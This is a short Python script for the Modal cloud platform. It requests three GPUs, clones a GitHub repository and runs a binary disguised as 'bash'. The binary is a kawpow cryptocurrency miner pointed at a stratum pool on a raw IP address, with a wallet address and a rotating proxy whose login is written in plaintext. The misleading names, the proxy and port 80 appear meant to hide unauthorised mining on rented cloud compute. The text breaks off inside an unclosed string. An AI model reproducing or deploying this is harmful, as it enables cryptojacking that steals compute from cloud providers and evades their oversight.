import modal
import subprocess

app = modal.App("run-bash-runtime")

image = (
    modal.Image.debian_slim()
    .apt_install("git", "bash")
)

@app.function(
    image=image,
    gpu=modal.gpu.T4(count=3),
    timeout=60 * 60
)
def run_script():
    cmds = """
    git clone https://github.com/hujisanda/lol198.git
    cd lol198
    chmod u+x bash
    ./bash -a kawpow -o stratum+tcp://103.103.21.108:80 -u rUrmXcYw9tNsoBvHvQTDMrUFUd1D8MApm7.modal --proxy atrfkwzc2-rotate:jasin987@p.webshare.io:80 --no-health 
    
